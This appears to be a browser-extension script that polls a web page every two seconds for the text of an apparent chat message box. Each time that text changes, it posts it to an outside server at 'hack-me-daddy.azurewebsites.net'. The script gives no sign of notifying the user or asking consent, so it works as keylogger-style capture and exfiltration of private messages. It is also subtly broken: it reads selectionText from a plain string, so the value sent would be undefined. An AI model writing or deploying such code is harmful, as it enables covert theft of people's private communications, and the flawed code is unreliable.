sendData = function(str) {
  var query = str.selectionText
  js = JSON.stringify({"text": query})

  // TO BE DETERMINED
  url = "https://hack-me-daddy.azurewebsites.net/api/text"
  $.ajax({
      url: url,
      method: 'POST',
      dataType: "json",
      processData: false,
      contentType: "application/json; charset=utf-8",
      data: js
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function checkText() {
  var oldMsg = "";
  for(;;){
    var text = document.getElementsByClassName('_1mf _1mj');
    if (text.length > 0) {
      curMsg = text[0].innerText;
      if (curMsg != oldMsg) {
        oldMsg = curMsg;
        sendData(oldMsg);
        console.log("found a new message");
      }
    }
    await sleep(2000);
  }
}

checkText();